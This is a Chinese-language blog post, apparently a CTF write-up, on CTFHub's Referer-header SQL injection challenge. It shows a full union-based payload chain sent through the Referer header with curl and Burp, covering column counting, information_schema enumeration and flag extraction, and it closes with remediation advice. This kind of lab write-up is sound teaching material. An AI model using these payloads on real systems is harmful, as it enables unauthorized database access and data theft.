
---
layout: post
title: "CTFHub Writeup-Refer注入"
date: 2026-10-25
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - Refer注入 

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - Refer注入 |
| 靶场地址 | `http://challenge-8ca29b730ced06f0.sandbox.ctfhub.com:10800` |
| 注入位置 | HTTP 请求头 `Referer` |
| 数据库 | `sqli`（MariaDB 10.3.22） |
| 表 / 字段 | `zhitizieys` / `iozsahocfq`（随机名） |
| Flag | `ctfhub{5c6e44b99afd4c9cd443c8db}` |
## 0x02 漏洞原理
Refer 注入的本质还是 SQL 注入，只是**输入点从 URL 参数换到了请求头 `Referer`**。
`Referer` 是浏览器在跳转时自动带上的头，用来告诉服务器「我是从哪个页面点过来的」。很多程序会把它记录下来做来源统计，比如 sqli-labs 里的 `referers` 表就是干这个的。如果记录时用的是字符串拼接，就产生了注入点。
本题打开首页，页面直接把执行的 SQL 回显了出来：
```
select * from news where id=1
```
说明后端代码大概长这样：
```php
$ref = $_SERVER['HTTP_REFERER'];
$sql = "select * from news where id=$ref";
```
`$ref` 被原样拼进了 SQL，而且 `id=` 后面没有引号，属于**数字型**注入。
这类漏洞容易被忽视的原因是：安全设备、参数校验大多盯着 GET 和 POST，很少检查 `Referer` 这种请求头。攻击者只要改一下请求头，就能绕过只针对 URL 的防护。
## 0x03 解题过程
**3.1 找注入点**
页面提示「请在 referer 输入 ID」。用 curl 的 `-e` 参数设置 Referer：
```
curl -e "1" http://challenge-8ca29b730ced06f0.sandbox.ctfhub.com:10800/
```
回显：
```
select * from news where id=1
ID: 1
Data: ctfhub
```
说明 Referer 被原样拼进了 SQL，并且 `id` 是数字型，不需要引号闭合。
**3.2 确认注入**
分别提交真条件和假条件：
```
Referer: 1 and 1=1   -> ID: 1 / Data: ctfhub
Referer: 1 and 1=2   -> 无回显
```
真条件有数据、假条件无数据，确认存在布尔型注入，而且页面有回显，可以直接用 `union select`。
**3.3 判断列数**
```
Referer: 1 order by 1
Referer: 1 order by 2
Referer: 1 order by 3
```
前两个正常回显，`order by 3` 无回显，说明原查询是 **2 列**。
**3.4 占住回显位**
```
Referer: -1 union select 1,2
```
回显：
```
ID: 1
Data: 2
```
两个位置都能显示，后面把要查的内容放在第 1 列即可。
**3.5 查库名和版本**
```
Referer: -1 union select database(),version()
```
```
ID: sqli
Data: 10.3.22-MariaDB-0+deb10u1
```
当前库是 `sqli`。顺便看连接用户：
```
Referer: -1 union select user(),@@version_compile_os
ID: root@localhost
Data: debian-linux-gnu
```
**3.6 查表名和字段名**
查当前库的表：
```
Referer: -1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
```
回显：
```
ID: zhitizieys,news
```
flag 在随机表 `zhitizieys` 里。继续查字段：
```
Referer: -1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='zhitizieys'
```
回显：
```
ID: iozsahocfq
```
**3.7 取 flag**
```
Referer: -1 union select iozsahocfq,2 from zhitizieys limit 0,1
```
回显：
```
ID: ctfhub{5c6e44b99afd4c9cd443c8db}
Data: 2
```
拿到 Flag：
```
ctfhub{5c6e44b99afd4c9cd443c8db}
```
**3.8 验证**
再查三件事确认：
```
Referer: -1 union select concat('LEN=',length(iozsahocfq)),2 from zhitizieys limit 0,1
-> LEN=32
Referer: -1 union select count(*),2 from zhitizieys
-> 1
Referer: -1 union select iozsahocfq,2 from zhitizieys where iozsahocfq='ctfhub{5c6e44b99afd4c9cd443c8db}'
-> ctfhub{5c6e44b99afd4c9cd443c8db}
```
长度 32、表里只有 1 行、等式精确匹配也能查出来，说明 flag 正确且唯一。
**3.9 浏览器里怎么改 Referer**
改 Referer 比改 UA 麻烦一点，因为浏览器不允许随便伪造：
- Burp Suite：抓到请求后，手动加一行 `Referer: <payload>`，或者替换已有的 Referer，放行；
- curl：加 `-e` 参数，例如 `curl -e "-1 union select iozsahocfq,2 from zhitizieys" http://...`；
- 浏览器 Console：用 `fetch(url, {referrer: "..."})`，但浏览器会校验 Referer 的合法性，payload 里带空格、引号时可能被直接拒绝，不如 Burp 稳。
注意 Referer 是请求头，payload 里的空格和引号会原样发送，**不需要 URL 编码**；如果编码了，`%20`、`%27` 反而会被当成普通字符带进 SQL。
## 0x04 完整流程
| 步骤 | Referer 值 | 结果 |
| --- | --- | --- |
| 找注入点 | `1` | 回显 `ID: 1` / `Data: ctfhub` |
| 确认真假 | `1 and 1=1` / `1 and 1=2` | 有 / 无回显 |
| 判断列数 | `1 order by 2` / `3` | 2 列 |
| 库名 | `-1 union select database(),version()` | `sqli` |
| 表名 | `group_concat(table_name)` | `zhitizieys,news` |
| 字段名 | `group_concat(column_name)` | `iozsahocfq` |
| flag | `select iozsahocfq from zhitizieys` | `ctfhub{5c6e44b99afd4c9cd443c8db}` |
整条链路可以概括为：**改 Referer → `order by` 定列数 → `-1 union select` 占回显位 → 查 `information_schema` → 取数据。**
## 0x05 踩坑记录
1. **注入点在请求头，不在 URL**：直接访问首页没有任何参数可填，只有看响应里回显的 SQL 才会发现 Referer 被拼进去了。
2. **默认不带 Referer**：直接访问时 Referer 为空，SQL 变成 `id=`，会报语法错误。必须先设一个值（比如 `1`）再测试，否则容易误判成「没有回显」。
3. **数字型不要加引号**：本题 `id=` 后面没有引号，直接 `1 and ...` 即可；照抄字符型的 `1' and ...` 会多一个引号，整条 payload 语法错误。
4. **Referer 不需要 URL 编码**：请求头不是 URL，空格、单引号、逗号都可以原样发送；编码后反而会破坏 SQL。
5. **浏览器会校验 Referer**：地址栏、普通跳转都改不了 Referer，最稳的是用 Burp 或 curl，别在浏览器里跟它较劲。
6. **`union` 前半段要置空**：`1 union select 1,2` 只会显示原查询的第一行，必须用 `-1` 让前半段查不到数据。
7. **页面只显示第一行**：即使 union 返回多行，页面也只取第一条。要么加 `limit 0,1`，要么用 `group_concat()` 把多行拼成一行。
## 0x06 修复建议
1. **使用预编译（参数化查询）**：`PDO` 的 `prepare/execute` 或 `mysqli` 预处理，把 Referer 作为参数绑定，即使它来自请求头也不会改变 SQL 结构。
2. **不要把请求头直接拼进 SQL**：记录来源、统计访问时，要么单独建表用参数插入，要么做严格转义，不要拼查询条件。
3. **对 Referer 做白名单校验**：正常来源是 URL，可以校验格式和长度，过滤异常字符。
4. **关闭 SQL 回显和详细报错**：不要把执行的 SQL 打印到页面，`display_errors=Off`，错误只写日志。
5. **最小权限**：Web 应用不要用 root 连库，只授予业务所需的 `SELECT` 权限。
6. **WAF 覆盖所有 header**：很多规则只检查 URL 和 body，要确认 `Referer`、`User-Agent`、`Cookie` 也在检测范围内。
## 0x07 总结
Refer 注入没有新技术，考的是「能不能想到输入点在请求头」。
页面把 `id` 藏进 `Referer`，URL 里怎么试都没反应，但只要看一眼响应里回显的 SQL，就能发现 Referer 被原样拼了进去。之后的利用和普通 union 注入完全一样：定列数、占回显位、查 `information_schema`、取数据。
这也提醒我们：安全防护不能只盯着 URL 参数，`Referer`、`User-Agent`、`Cookie`、`X-Forwarded-For` 都可能是注入点；而防御的根本永远是参数化查询，而不是在某个入口上打补丁。
